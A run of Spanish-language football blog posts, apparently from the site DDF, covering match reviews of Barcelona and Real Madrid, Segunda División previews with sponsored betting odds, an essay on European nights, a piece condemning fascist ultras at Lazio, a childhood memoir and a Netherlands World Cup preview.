automatizada- y el equipo sólo jugó a destellos. Los de Silva, básicamente, porque Navas estuvo perdido y Kolarov atacó con más entusiasmo que medida. Sólo Kompany estuvo integro todo el partido. La ida será suicida para el equipo celeste y ahí es donde el Barcelona disfrutará cómodamente de sus largas posesiones.Uno nunca valora lo que tiene. Está en nosotros. Yo ayer vi a un Barcelona sólido y competitivo, aclimatado a la cima, con capacidad suficiente para llevarse una eliminatoria de nivel. Me espanta pensar que el espíritu de Cruyff, Rijkaard o Guardiola ha conducido a este envilecimiento del aficionado, a esta crítica desmesurada e impostada. Yo, que no soy del Barcelona precisamente, pienso que el paradigma del fútbol blaugrana debería enseñarse hasta en los institutos, pero que su consecución óptima es producto del trabajo y también la suerte. Cuando el otro día Paco Jémez se llevó seis goles del Camp Nou eran muchos los que criticaban el esquema imprudente del entrenador. Competir es ganar, no a cualquier precio pero sí con ciertos sacrificios. Ayer Martino salió con lo que tenía y se llevó un partido, sobre el papel, complejísimo. Cuando cerré Twitter anoche pensé en esos amigos míos que me dicen por la calle “qué bien vives” cuando ellos vuelven a casa con su familia a las nueve de la noche y yo salgo porque he quedado con una Erasmus para tomar una cerveza y tratar –inútilmente- de ligármela. A esos amigos a los que miro pensando “te cambio las cervezas y las Erasmus por tu casa, tus niños, tu mujer y tu perro”. Confesar que uno no valora lo que tiene hasta que lo pierde. Querría ser de este Barça a veces ramplón, a veces feo, que ayer casi selló su paso a los cuartos de final de la Champions, de la competición más hermosa y difícil para un club. · Imagen: www.fcbarcelona.com Algún día publicaré un libro al que titularé “Las noches europeas”. Será un libro de amor. De todos los amores que he conocido, me quedo con el amor futuro. El que aún no se tiene pero se palpa. El de los partidos no ganados y el de las copas no levantadas. Ese amor es un universo de posibilidades. Cerrar los ojos para ver. El amor va de la cabeza a los pies y el fútbol va de los pies a la cabeza. Es la única diferencia entre estos dos hitos de la humanidad. El amor y el fútbol buscan la perpetuidad. Los dos nos hacen gritar y llorar, compartirnos y encerrarnos. La caída de los párpados, tras el coito enamorado y el gol de tu equipo.Ese momento de alcanzar un momento único en la existencia. Que después se vulgariza, que después incluso se pierde en el recuerdo o se trata de olvidar tímidamente. Pero ese instante, ese del cuero lamiendo la red y el de la carne haciéndose parte de otra carne. Ese segundo es único, absoluto y esperanzador.De todos los amores que he conocido, me quedo con el de las noches europeas. El de esa copa inasible. La Copa de Europa ha sido ganada por sólo 22 equipos a lo largo de sus 60 ediciones. La UEFA tiene 54 federaciones de fútbol, 54 ligas con sus, aproximadamente, 20 equipos en la máxima categoría. Cientos de equipos la han jugado y no la han ganado. Miles de equipos no la han jugado todavía. Decenas de miles de equipos no la jugarán nunca. Cientos de miles de futbolistas profesionales ven la Champions por la tele. Como nosotros a partir de esta tarde, con el sorteo que abre las hostilidades en una competición diseñada para el amor.Dice Milan Kundera que “el amor, por definición, es un regalo no merecido; ser amado sin mérito es incluso la prueba de un amor verdadero”. No sé si habla de la Champions que levantó Mourinho con el Inter, o la de aquella noche de mayo de 2005 en Estambul, o las lágrimas de Cañizares o el gol de Solskjær. Hay en las noches europeas una sábana de tragedia extendida sobre el césped, como el balón estrellado que unos niños agitan en el círculo central antes de cada partido. Hoy en el bombo caben las bolas y caben los sueños y las pesadillas de 32 equipos. 30 caerán eliminados. Otro perderá la final. Para esto están los datos en el fútbol, para demostrarles a la afición que, calculadora en mano, el fútbol es un deporte desolador. Donde perder es lo normal. La moda es caer derrotado y meter la cabeza entre las rodillas para que no te vean llorar en el vestuario. Volver a casa tras un partido. Recuerdo el silencio saliendo del Sánchez Pizjuán cuando lo del Fenerbahçe. Como un amante expulsado del amor. Tras la ruptura sólo nos queda el consuelo del asfalto o el alcohol. Es maravilloso encontrar en la misma barra al que ya no aman y a su lado al aficionado derrotado y que no haya forma de diferenciarlos. Salvo la bufanda si por fiereza aún la lleva amarrada al cuello.Cuatro bombos: los regulares, los buenos, los muy buenos y los buenísimos. A partir de las 18:00 h. en el Fórum Grimaldi de Monaco se vaciarán los baloncitos. Espera la final en San Siro. “Road to Milan” dirán. A mediados de septiembre empezarán los partidos y entonces ya dará igual el fútbol, porque volveremos al amor como se vuelve a las cosas importantes: sin condiciones, sin matices. Dice Albert Camus: “No ser amados es una simple desventura; la verdadera desgracia es no amar”. Podría ser una buena cita para mi libro “Las noches europeas”. Podría decir Camus que el fútbol no se discute. Que quien se niega a vivir los noventa minutos con el corazón en un puño es un desgraciado. Quién puede hacerle feos a esa orgía de emociones que es un partido de fútbol, quién puede resistirse a esa enajenación espiritual que guía una pelota de cuero, el viento, decenas de pies y el azar. Es como el amor, que llega y llega y ya está por más vueltas que le des a la cabeza o más blindaje que le pongas al corazón. Que da igual si te han hecho daño o el que heriste fuiste tú y aún te pesa en la consciencia. Cuando el amor llega hay que jugarlo, como cuando el árbitro pita el inicio del partido y, paradójicamente, nuestro primer impulso es ir hacia atrás. Por algún tipo de inconsciente mecanismo de defensa en vez de golpear el balón con fuerza y los ojos cerrados hacia la portería contraria, abandonados al amor como un adolescente en verano, el fútbol nos obliga a protegerlo. A mimar la bola. Jugarla con cabeza esos segundos inmensos que anteceden al músculo y el corazón.En mi libro hablaré de una pareja que se quiere en la distancia y que pronto compartirán casa. Hablaré del miedo, de la convivencia, de cómo lo que se busca termina encontrándose. Habrá alguna discusión y dudas. Porque el amor así lo exige. Pero después ella irá a por cerveza y él cocinará algo con más voluntad que talento. Con la mesa puesta y los vasos llenos, a las 20:45 h. se sentarán en un sofá porque empieza un partido que tiene trascendencia más allá del césped. En “Las noches europeas” todos los partidos se disputan dentro de uno mismo. De la cabeza a los pies. Será un libro de amor y todos lo hemos escrito, o lo escribiremos, algún día.Para muchos aficionados la Segunda División es el restaurante de kebabs que nunca cierra. Me explico. Cuando salimos tarde y estamos hambrientos y todos los bares están cerrados, de repente hay una luz brillando y una cola de gente que esperan la carne troceada y el chorreón de salsa sin pensar demasiado en qué van a comerse. Como este fin de semana, en el que hay poco fútbol por los compromisos de las selecciones nacionales y en algún lugar de la televisión ponen esos partidos que habitualmente olvidamos a lo largo del año. Eso a lo que llaman pozo. Equipos históricos venidos a menos y equipos humildes venidos a más. Todo mezclado casi al azar, como el maíz, la remolacha y la lechuga de un shawarma.Deportivo y Hércules son dos de los favoritos para subir. No es matemática aquella regla por la que los recién descendidos de Primera tienen mayores posibilidades de subir de nuevo a la máxima categoría. Lejos, el Atleti puede explicárnoslo, o el Betis hace menos, o el Tenerife hace nada. Pero tanto coruñeses como alicantinos tienen algunos argumentos a favor. Ninguno ha destrozado del todo su equipo. Han arreglado algunas cosas y, sobre todo el Hércules, se han deshecho de algunos fichajes de relumbrón –Trezeguet, Valdez, en menor medida Lopo o Adrián– que no están para jugar en la plata de nuestro fútbol. Son dos clubes con una capacidad económica por encima de la media de la categoría, obviando a los filiales, los gallegos tienen el mayor presupuesto y los valencianos el séptimo del global. Y por último, su fútbol en los primeros compases los hacen, sino brillantes, al menos eficaces. Está unánimemente admitido que para subir en la Liga Adelante no es necesario tanto hilvanar fútbol como solventar encuentros por la vía rudimentaria. Es una categoría larga, estresante, caprichosa y traicionera y aquí valen más las botas bien atadas que las botas bien limpias.Cada semana, y de la mano de bwin.com, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on line.Ambos equipos comenzaron con victoria, más lucida la del equipo mitológico, y aunque un poco prematuramente ya se apuntan como favoritos junto a Valladolid o Elche para pelear por los puestos de arriba. El Dépor ha mantenido una formación con mucha experiencia en Primera, desde Manuel Pablo a Riki pasando por Guardado o Valerón son jugadores que han rendido en situaciones de más enjundia que esta competición. Mención al portero Aranzubia, que tras algunos años de titubeos se ha convertido en un baluarte para los suyos. El Hércules ha pescado algo más en la Segunda, la idea es no sufrir de éxito reciente y encargar la empresa a jugadores que sufren y conocen el entramado de piernas del torneo. Callejón puede servir de ejemplo. También el buen portero Falcón o el experimentado defensa del Recre Pepe Mora.La sensación es que tanto Mandiá como Oltra saben a qué quieren que jueguen sus equipos y el objetivo está claro, retomar a la Liga BBVA cuanto antes. No es un viaje fácil. En estas latitudes es difícil hacer apuestas. Todos los años, recordad el Granada la pasada temporada, hay equipos que sorprenden y se encaraman a los primeros puestos pisando las cabezas de los favoritos. Fin de semana de segunda, por lo tanto, de refresco y kebab a la salida del estadio.Según la casa de apuestas online bwin, el Deportivo es favorito para ganar el partido, con una cuota de 1.88 euros por euro apostado. Se paga alta la victoria visitante a 3.90 €, un resultado en absoluto descartable viendo como han empezado ambos equipos y lo imprevisible de la categoría. También podemos echar un vistazo al ganador de la competición, muy precipitado tal vez, pero con la posibilidad de ganar 9.50 euros por euro si creemos que el Hércules quedará primero o 4.50 si creemos que será el Deportivo, favorito para el liderato final según bwin. Ayer vi el Betis-Madrid en un bar malagueño llamado “Be Happy”. El nombre del antro es siniestro si pienso en ese equipo desdibujado, temeroso y frío que Garrido sacó ayer al césped. Salvo Baptistao, que juega con desparpajo y parece que aún no es un infectado, el resto del once estaba apático y parecía abocar a un final tristísimo como es el descenso. El partido no tuvo historia, fue un abuso de patio de colegio. El Real Madrid no necesitó hilar jugadas para golear, se limitó a tirar de lejos, aprovechar la torpeza defensiva del club sevillano y adelantar las líneas lo suficiente para que el pelotón bético no encontrara espacios. Ancelotti podría haber estado jugando al Candy Crush en el banquillo y el resultado hubiera sido el mismo. En cualquier caso, hay varios nombres que merecen un comentario más extenso y algunas pinceladas malintencionadas con mi reflexión:Andersen. He visto poquísimo de este portero, pero nunca me había parecido tan malo como ayer. El intangible en la portería es la tranquilidad de los defensas. No sólo vale con sacar dos o tres buenos “mano a mano”. Un buen portero ordena a los suyos, les saca los balones por arriba, se anticipa a los balones en profundidad o tapa su palo en las faltas. El primer gol de Cristiano es imparable pero el lanzamiento de falta de Bale y la actitud del danés, estático primero y echándole la culpa a la visibilidad es de tener muy poco respeto por el trabajo de sus compañeros. El Betis es un “sálvese quien pueda” y da la sensación de que el guardameta danés lleva con las maletas hechas un mes. Sara, suplente ayer, no me da garantías en lo que le he visto jugar, pero no creo que roce si quiera el pasotismo que el internacional danés irradiaba contra el Madrid.Garrido. Las pitadas a un entrenador no son argumento para la destitución. Seguro que los mismos que ayer pedían el retorno bajo palio de Mel en su día lo pitaron cuando el equipo no carburaba en Liga. Lo que sí está claro, tratando de ser objetivos, es que el Betis no sólo no ha mejorado con el cambio de entrenador sino que ha empeorado. Un punto de quince posibles en Liga y eliminado de la Copa del Rey, si mis cálculos no fallan, es un balance que tiene más de repulsivo que de revulsivo. La idea párvula de acumular hombres de ataque, de buscar la verticalidad como jinetes de Rohan sin un plan, sin una estrategia, a las bravas, poco puede ayudar a un equipo como el Betis acostumbrado a tocar el balón con cierto criterio. Garrido está superado por el ambiente, es incapaz de motivar a una plantilla cariacontecida que corre hacia el interior del túnel en vez de dirigirse, aunque sea torpemente, hacia la luz salvadora.Modric. Como no quiero ser ventajista, hablaré mal del croata precisamente hoy, tras ver uno de sus mejores partidos con el Madrid. Ayer, sin más compañía que mi café y el partido, busqué compañía futbolera en el grupo de whatsapp que compartimos los editores de DDF. Hilo en el que raramente se habla de fútbol, dicho sea de paso, salvo excepciones como la de ayer.Critiqué a Modric por lo siguiente: creo que es un jugador que equilibra, sin duda, pero el centro del campo del Madrid tiene que desequilibrar. Su pareja, Xabi Alonso, ya se basta el sólo para juntar las líneas, apaciguar los ataques y ordenar las transiciones. ¿Cuál debería ser la labor de Modric? Yo creo que jugar más arriba, canalizar los contraataques y buscar a Bale y Di María más que al propio Cristiano Ronaldo. Modric me parece un jugador intrascendente. Correcto pero no necesario, prescindible cuando está Khedira. El peso ofensivo, creativo y organizativo del Madrid lo está llevando, por galones y capacidad, Cristiano Ronaldo. La posición de Modric entonces, ¿para qué sirve? De cara a lo que queda de campeonato yo creo que, viendo las labores de Ronaldo, la posición de Modric la ocuparía con un jugador de corte más defensivo, un Khedira algo más talentoso, o aquel Illarramendi que quería Ancelotti y que –de momento- no está encontrando. Los cuatro de ataque se bastan. Bale, Cristiano, Benzema y Di María son la apuesta del Madrid. Modric no es resolutivo así que yo daría un paso atrás, metería un hombre de contención y trataría de frenar las carencias defensivas de un equipo que arriba tiene oro y abajo tiene bronce. Conservador, quizá, pero la alegría no da campeonatos y lo que funcionó ayer con el Betis no tiene por qué funcionar con equipos como el Schalke o el City o el Bayern o el que toque si pasan. La respuesta en el grupo de Whatsapp no fue templada. Cambio de cromos, capricho de madridismo, esas cosas que nos decimos porque somos amigos. Borja Barba fue el que menos simpatizaba con mi crítica a Modric, así que desde aquí le emplazo a compartir un post hablando de él. Él bien, yo mal, por supuesto.Benzema. Como he criticado mucho a Benzema voy a reconocer que veo bien al francés. Jugar sin presión –no hay un Higuaín que le tosa, sólo Morata cuya labor está siendo intermitente y casi testimonial- le ha venido bien al pusilánime punta francés. Está suelto, le llegan muchos balones, juega –gracias a la caballería que pone arriba Ancelotti- cerca de la portería contrario y los apuros que pasó con Mourinho –que le exigía mucho más que goles- ya son parte del pasado. Ahora Benzema no crea, sólo culmina. Abre espacios, juega entre algodones y encima le dan descanso si el partido va a favor. Un buen momento para él que deberá refrendar en Europa. La estupidez no es patrimonio exclusivo del fútbol. Hay estúpidos en las oficinas, en el metro, en los parlamentos, en los periódicos, tras la barra del bar, hasta en televisión hay gente verdaderamente estúpida. Ensalzar un régimen cuyo mayor logro fue recortar los derechos, enfangarse en una guerra y concebir el asesinato como si fuera el pienso que alimenta un Estado voraz y enfermo, es verdaderamente estúpido. Para desgracia de la Lazio, un cuantioso número de estúpidos han decidido visitar el Olímpico de Roma semana tras semana para animar a sus jugadores. En una esquina, en la grada norte, florecen todos aquellos símbolos que tantos muertos costaron enterrar. A esa larga lista de cerebros anoréxicos se une Mauro Zárate que decidió, hace una semana, sumergirse en la tripa fascista de sus hinchas y que, no contento con agitarlos en la distancia con sus goles, decidió vivir en primera persona aquel magma de irracionalidad. En la boca del lobo, o de la loba, tratándose de Roma, chupando de la teta del odio como uno más, alzando su brazo derecho disciplinado, haciéndose querer, jugando con los violentos, con los racistas, con todo aquello de lo que una persona con algo de estima por los demás debe huir.Una piedra pesada atada al tobillo del fútbol la de los ultras en los estadios. La de las palizas en las inmediaciones del campo, la de los gritos racistas, lanzar plátanos al césped, agitar banderas con esvásticas, ese continuo llamamiento a la lucha, como si el fútbol fuera el resumen doméstico y semanal de una guerra, como si mereciera la pena batallar contra otra persona por el simple hecho de defender a otro equipo, de vestir otros colores, de acompañar a la expedición por Europa, como si el disfrute del fútbol exigiera el odio hacia los otros. Que ridículo sentimiento el de la anulación del rival, machacar al negro, expulsar al judío, llamar extranjero al extranjero, invadir el espacio de la moral con la excusa de un balón de cuero. El titubeo del goleador argentino con los irreductibles dice más de él que cualquiera de sus celebraciones.Desprecio a unos valores universales para hundirse en unos principios blindados, excluyentes, como un digno heredero de Di Canio.El fútbol no es violencia pero es innegable que la violencia está en el fútbol, que se alimenta de él. El ejemplo de Zárate es esclarecedor, hay una tolerancia maquillada, muchos clubes miran hacia otro lado mientras unos y otros se enzarzan en peleas, jerarquizan la afición, criminalizan el sano apoyo a un equipo. Ya pasó con Balotelli, con Eto´o en España, con aficiones citándose armadas para dirimir quien sabe qué asuntos intrascendentes, pasó con la invasión en San Mamés. Hay estúpidos en todas partes, hay estúpidos que gritan mucho y hay estúpidos que callan y toleran lo que otros estúpidos hacen. Veo todos los partidos del Barcelona. Cuando el árbitro pita el comienzo, dejo lo que estoy haciendo y me pongo a ver jugar a Messi y los suyos. Lo hago por si pierden. No quiero quedarme sin ese pequeño placer de ver una derrota azulgrana. He vivido a la sombra de un gigante. Desde pequeño, con el Barça soy como un aldeano en el Medievo que ve acercarse a su Señor en el caballo.En el año 1989 unos tíos míos, lejanos y despistados, me regalaron la camiseta del Barcelona. Me confundieron con algún primo culé. Primero sonreí creyendo que era algún tipo de broma familiar. Mi sonrisa de perplejidad fue confundida con ilusión. “Pruébatela a ver si te está bien”, me dijo mi tía. Con docilidad infantil me la enfundé. Me sentaba como un guante. La del Madrid me hacía gordo. Esta me estilizaba, me erguía los hombros. Algo tenía esa maldita camiseta que fue mirarme al espejo e imaginarme celebrar un gol en el Camp Nou.Me la quité con cariño y la guardé en la bolsa donde venía. “Para que no se manche” dijo mi madre, que algo notó. Ella es ajena al fútbol. Como mi padre. Yo era del Madrid secretamente. En la clandestinidad merengue de pegar escudos en el interior de las carpetas. Por las noches rezaba a Butragueño. “Ojalá marques muchos goles este fin de semana, Emilio”, le decía. Ellos tienen a Jesús, yo tenía a Emilio. Para qué más.Cuando me confesé en la Catequesis le dije al cura que a veces oraba imaginándome que hablaba con mi ídolo futbolístico. Dije “orar” igual que los malos estudiantes dicen “la cual” cuando hablan en público, por creer que así mis palabras eran más profundas y sensatas. Los confesionarios de madera oscura y rejillas inquietantes. Don Miguel me dijo que como broma lo entendía, pero que no podía venerar a ídolos porque así se perdía el hombre, buscando comprensión en falsos dioses, pidiendo refugio a imágenes inertes. No entendí. Me habló de un becerro de oro y entendí aún menos. La metáfora era un recurso estéril para mí, luego de adolescente me aficioné. Y perdí la fe y la dignidad en los bares de Ciudad Jardín. Ciudad Jardín no es un barrio, es un estado de ánimo.El cura me obligó a rezar no sé cuantos padrenuestros y un puñado de avemarías que como nunca me lo terminé de aprender lo recitaba así de carrerilla como los viejos que aún recuerdan alineaciones del pasado. En el castigo comprendí que lo que hacía no estaba bien. Que era como jugar con algo muy serio para otra gente. En la condena se aprende rápido. Lástima que nunca temiera a la muerte de esa forma de anciana melindrosa, de feligresa. No dejé de comunicarme con El Buitre, a los nueve años todo da igual. La reinserción tras la penitencia. La catequesis. “Que si el verbo se hizo carne, carne se queda“, como canta Sr.Chinarro.La noche de la camiseta del Barcelona me metí en la cama. En la cama de antes que era como un milhojas de mantas y sábanas. Cerré los ojos y recé a Emilio Butragueño. Le pedí perdón. Le dije que me gustaban los colores y que era de mi talla pero que jamás me la pondría de nuevo. Le desee suerte en su próximo partido y que me deseara suerte a mí, que al día siguiente tenía partidillo en las pistas tras la clase de la tarde. Ese fin de semana Butragueño no marcó. A mí me metieron siete. Pensé que el madridista se había enfadado conmigo por lo de la camiseta. Le volví a pedir perdón, noche tras noche. Al siguiente fin de semana tampoco marcó. Era un partido contra el Málaga. Anotó Hugo Sánchez pero él fue sustituido. Le vi marcharse cabizbajo del rectángulo esmeralda y lo imaginé diciendo “me has traicionado, Antoñín. Con el Barcelona”. Pensar que el Madrid dependía de mí era tan real como mis manos ahora. Liderábamos con comodidad la Liga, pero si Butragueño no marcaba, no había Real Madrid, y si no había Real Madrid, cientos de miles de niños nos quedaríamos huérfanos de equipo. Y todo por esa maldita camiseta que, por error, me regalaron unos tíos a los que hacía años que no veía.Hablé con mi madre como quien pide ayuda al Padre Karras. Le dije que la camiseta del Barça estaba dando mala suerte al Madrid y que no la quería. Le puse la camiseta, aún en la bolsa, en las manos. “Toma mamá” dije ceremonioso. “Tírala”. Mi madre no entendía nada pero lo entendió todo. Cogió la camiseta y me mandó a jugar a la calle. Ya jamás volví a ver la camiseta pero al siguiente partido Butragueño tampoco marcó. A mí me volvieron a meter siete.El Barcelona es mucho más que un equipo. El Barcelona es un quebrantasueños. El Barcelona es el gigante que pisa a los que corren huyendo de él. Hay mucha gente del Barcelona pero hay muchísima más gente que no es del Barcelona. Que es de otros equipos apisonados por un equipo que lleva muchos años siendo el mejor. Por eso me gusta verlo, para no perderme si pierde. Para ver si mi madre hizo el trabajo correctamente. Si quemó la camiseta, o la tiró al contenedor, o la hizo llegar al primo adecuado. Aunque, en el fondo de mi corazón y viendo los últimos años del Barcelona, temo que la camiseta siga en la misma bolsa. Guardada en el fondo de algún armario en el piso familiar. Dando suerte a los culés mientras Butragueño, en su despacho, se rasca la cabeza pensativo, diciendo para sí mismo: “¿qué mierda está aquí pasando?” . Todo lo que ocurre en el mundo es futura carne de poema. El amor, el hambre, la guerra o los besos que nunca dimos. Hasta lo que no está puede acabar llenando un cuaderno de versos, por ejemplo, la existencia de dios; por ejemplo, la ridícula mecánica de la existencia. Para muchos de vosotros, como para mí, no hay cosa más grave en este mundo que una derrota, ni más dichosa que una victoria, ni más amarga que un penalti fallado en el último minuto, ni más extática que alzar una copa. Como los poetas, por más que pueda sorprenderos, son gente normal, también escriben sobre fútbol. En mis manos está el libro “El gol nuestro de cada día”, una antología de Francisco J. Uriz publicada por Vaso Roto Poesía. En él, gente de mal vivir desglosa su pasión balompédica en renglones que jamás llegan al margen derecho del folio. Entre ellos, ya adelanto, estoy yo mismo, la excepción que confirma la regla, porque el libro es una auténtica gozada.Me cuesta seleccionar algún poema. Hay lugar para el panegírico más desgarrado como esa “Oda a Kahn” escrita desde el corazón por Albert Ostermaier o el laudatorio de Pablo Hidalgo al genio argentino Lionel Messi “Te he visto parar el partido y preguntar. / ¿Qué queremos de todo esto, / un día de gloria o una forma de vida, / un trofeo o un proyecto en el tiempo para los demás?” . Hay hasta una “Oda a Pep Guardiola” con versos como “¡Salve, constructor de caminos / geómetra carnal, arquitecto / de torres de victoria!” , que dejan a las claras que dentro del creador late un hincha con más tripa que seso, con más entusiasmo que reflexión calma. Es parte del encanto de este poemario, la doma de un sentimiento hirviente, su cristalización en algo más trabajado y menos perturbador que el alarido en el estadio, su conversión en un poema que encierra todo aquello y además algo de sensibilidad y orden.Hay composiciones volcadas en el sentimiento futbolístico, en el marco en el que se desenvuelve el fenómeno del cuero “Cómo vas a saber lo que es el amor / si nunca te hiciste hincha de un club”, que canta Walter Saavedra, o la precisa descripción de Baldomero Fernández “Son veintidós muchachos, las rodillas / al aire. Olor a magulladas hierbas”. No es casualidad que la obra comience con la celebrada cita de Camus “Todo cuanto sé con mayor certeza sobre la moral y las obligaciones de los hombres, se lo debo al fútbol”. No sé si sois lectores de poesía, tampoco importa demasiado. Siempre he dicho que para disfrutar de la poesía no hace falta saber sobre ella. Pasa igual con el fútbol, no es necesario conocer el club de origen de un extremo serbio para disfrutar de su regate. Que no os confundan. La poesía, como el fútbol, es una creación de gozo inmediato. Abandonaos un poco a la lírica, encontraréis en estos poemas extractos de nosotros mismos, fotografías de una pasión que sobre el césped o el papel merece ser revivida.Empate a cero. Dos porterías huérfanas. El Levante renunció al ataque y juntó las líneas para evitar la famosa pegada del Madrid. Los blancos dieron por hecho que el equipo granota no iría a por el partido y jugaron cómodamente arriba, con Marcelo permanentemente incrustado en la banda zurda. Sin embargo, la suma de Özil, Di Maria, Cristiano Ronaldo e Higuaín no garantizó los goles. El Madrid cayó en una depresión de juego, abusando de los balones al área, probando constantemente a Manuel Reina, que hoy fue el mejor de su equipo. Cuando vino Mourinho en verano los más agoreros anunciaron algo parecido a esto. Un equipo seguro atrás y con capacidad para marcar un gol más que el contrario. Hoy ni eso. Los problemas se acumulan y hay síntomas que no hacen esperar nada bueno. Es la primera vez que tengo la sensación de que Cristiano Ronaldo crea más problemas que soluciones. Es un agujero negro que engulle la energía de todos sus compañeros. Que juega rápido pero impreciso, que elige la opción más difícil y que solivianta a los contrarios. Es un incentivo para el rival. Anularlo ha sido un estímulo más para los jugadores del Levante.Di Maria tiene capacidad de desborde pero no encuentra aliados arriba. Higuaín ha empezado perezoso la temporada. Alejado de la portería, perdido entre los centrales, con muy poca capacidad para sorprender a los contrarios. Ni el mano a mano que tuvo en las postrimerías del partido pudo servir para redimir una presencia fantasmagórica en la vanguardia del equipo. Si la solución es poner a Benzema queda todo dicho. El francés no aprovecha sus minutos. Mourinho le pidió veladamente desgaste defensivo, y eso hizo nada más salir. Correr de un lado para otro para tapar la tímida salida del Levante e intentar asociarse a un autista Cristiano. Ni Pedro León con su derecha privilegiada logró levantar el balón en los centros para darle al choque un poco de peligro.El Madrid no carbura y hoy ante un ejemplar Levante, expeditivo, centrado y sabiendo perfectamente a qué quería jugar, no han sido capaz de imponer el talento y la calidad que se le supone. El equipo valenciano ha sido un anfitrión incómodo para los hombres de Mourinho. En el club blanco da la sensación de que no hay plan, de que no reman todos en la misma dirección. Confío en el portugués, tiene un crédito amplio, ha demostrado mucho como para defenestrarlo en la primera curva, pero este Madrid no está cómodo y no evoluciona. Los problemas son los mismos que los de hace un mes. El buen juego, de llegar, será como un pozo de petróleo manando inesperadamente. Hasta que ese momento llegue, la parroquia merengue deberá contemplar con paciencia  como su equipo patalea y  porfía torpemente sobre el césped. El fútbol es un deporte desagradecido. No se ablanda ante el jugador generoso, ni discrimina el arte del pelotazo. No se enternece cuando un equipo sale al campo a regalar hermosura,  a hilvanar el juego, a domar la pelota y ponerla justo en el sitio que más duele. No sólo cuentan los goles sublimes, también los rechaces, aquellos balones que se cuelan en la red por debajo del portero, vomitados por el poste, ayudados por el fuera de juego, tras un penalti injusto, empujados sutilmente con la mano. Holanda siempre tendrá el apoyo de los aficionados al fútbol elaborado, aquel que se juega con el balón rodando por el césped, eléctrico, rápido en la definición, con una vocación ofensiva indiscutible. Donde Cruyff se hizo un gigante. Asombró a Europa con el Ajax y colocó a la, hasta entonces, gris selección holandesa en la memoria de los amantes de este deporte cruel. Dos finales consecutivas, dos derrotas dolorosas. A las ordenes de Michels en el 74, con el flaco de estrella absoluta, y de Happel en el 78, sin el delantero universal pero con el decisivo Neeskens, el combinado de Paises Bajos reinventó la estrategia, el bautizado como fútbol total. Movilidad frente a rigidez defensiva, aprovechamiento de las bandas, ese 4-3-3 que aún resume la mejor cara de un deporte que a veces se pierde en la especulación y el resultado. Dos finales perdidas, ambas ante las anfitrionas. Aquella Alemania de Müller y la Argentina de Kempes. El fútbol es un tirano caprichoso que no alcanza a entender que debe algo a una selección que aún hoy protagoniza el álbum fotográfico de los Mundiales. ¿De qué sirve la inspiración sin títulos? ¿Qué sobrevive mejor al tiempo, la pobladísima vitrina espartana de Italia o la solitaria Eurocopa del 88 ganada desde la brillantez? Si algo se le puede reprochar al conjunto Oranje es que nunca han logrado rematar su apuesta balompédica.El recuerdo más cercano en Austria hace dos años, con un juego eficaz y plástico que murió en un flojo partido ante una selección inferior como Rusia. Es hora de acoplar el juego al resultado, que esa inmensa fábrica de talento logre compensar un equipo, hacerlo competitivo, plantarse en una final, y ganarla. Lo tiene claro su entrenador, Bert van Marwijk. A Sudáfrica van a ganar. Nada de juegos florales. Los 23 seleccionados mezclan talento con rigor táctico. Su disposición sobre el campo es consecuente. Dos bloques casi independientes, el talento arriba, con cuatro jugadores explosivos, rematadores. Un mediapunta, seguro Sneijder, sin muchas obligaciones defensivas. Jugando tangencial al área rival. Reforzado tras una temporada de ensueño en el Inter, dejando atrás la crisis de juego que le botó del Madrid. Y una línea de tres invadiendo las propiedades del portero contrario. En principio, Robben, Van Persie y Kuyt. Si el jugador del Bayern se recupera a tiempo de esta inoportuna lesión. Es fundamental su desmarque, la permanente amenaza de su velocidad y sus diagonales coronadas con inapelables disparos al palo largo. Van Persie llega muy entero tras una temporada prácticamente ausente en la Premier. No es un delantero al uso, su tendencia a la banda abre las posibilidades del equipo en ataque, enriquece el juego, aunque se pierde esa referencia clásica que aportaría su hipotético suplente, Huntelaar. En la punta de ataque Kuyt. Un nueve extraño, al que estamos acostumbrados a ver en el Liverpool como un futbolista de desgaste, presionando la salida rival, volcado en la banda, esforzado en un juego turbio, poco vistoso, como casi todo el bloque de Benítez. Hasta ahí el talento titular, con Afellay, Van der Vaart, Elia o Babel en la recamara. Piezas intercambiables, pero con idénticos roles sobre el césped.El equipo se articula en torno a dos pivotes, posiblemente y tras el descarte de Engelaar, Van Bommel y De Zeeuw. Ellos deben gobernar el equipo y evitar la fractura del bloque. La subida limpia de los laterales depende de su solidaridad y concentración.Si el equipo logra integrar a su panda de vanguardia con la ayuda de los defensores de los costados, la superioridad frente al rival será apabullante. En la defensa las cosas flojean un poco. El prometedor lateral Van der Wiel contrarresta al empequeñecido Van Bronckhorst y al tibio Braafheid. Ni Heitinga ni Mathijsen son un seguro atrás, tampoco Boulahrouz. Ahí es donde sufrirá el combinado holandés. Cuando toque replegarse la autoridad del mediocampo será fundamental para no sufrir los ataques a Stekelenburg.Difícil misión la del combinado Oranje. Ganar, divertir, pasar de ronda por la vía de la estética. Redimir a aquella selección, a la naranja mecánica, a ese conjunto que revolucionó el fútbol en los 70. El fútbol le debe algo a este equipo. Guste o no, equipos como el holandés son necesarios en este deporte. En Sudáfrica intentarán levantar la Copa que la historia les negó, sin renunciar a sus esencias, sin renunciar a su brillante apuesta.Lo mejor: Su estilo de juego, esa conciencia irrenunciable sobre su planteamiento, una tradición, un estilo reconocible y universal.Lo peor: La defensa. Tanto talento ofensivo contrasta con una defensa templada, sin grandes nombres, su punto débil.Jugador a seguir: Sneijder. El centrocampista más en forma la pasada temporada en Europa. Tiene mucha culpa de la estelar campaña del Inter. Siempre aporta soluciones, siempre crea peligro.Pronostico DDF: Holanda debería tener un lugar en las semifinales.Los 23 mundialistas:PorterosMichel Vorm (Utrecht)Maarten Stekelenburg (Ajax)Sander Boschker (Twente)DefensasKhalid Boulahrouz (Stuttgart/GER)John Heitinga (Everton/ING)Joris Mathijsen (Hamburgo/GER)André Ooijer (PSV)Giovanni van Bronckhorst (Feyenoord)Gregory van der Wiel (Ajax)Edson Braafheid (Celtic/ESC)CentrocampistasIbrahim Afellay (PSV)Nigel de Jong (Manchester City/ING)Wesley Sneijder (Inter Milan/ITA)Stijn Schaars (AZ Alkmaar)Demy de Zeeuw (Ajax)Mark van Bommel (Bayern Munich/GER)Rafael van der Vaart (Real Madrid/ESP)DelanterosRyan Babel (Liverpool/ING)Drik Kuyt (Liverpool/ING)Eljero Elia (Hamburgo/GER)Klaas-Jan Huntelaar (AC Milan/ITA)Robin van Persie (Arsenal/ING)Arjen Robben (Bayern Munich/GER). Cada semana, y de la mano de Betfair.com,  os ofreceremos el análisis de los partidos más interesantes del fútbol  europeo, con una especial atención a todos 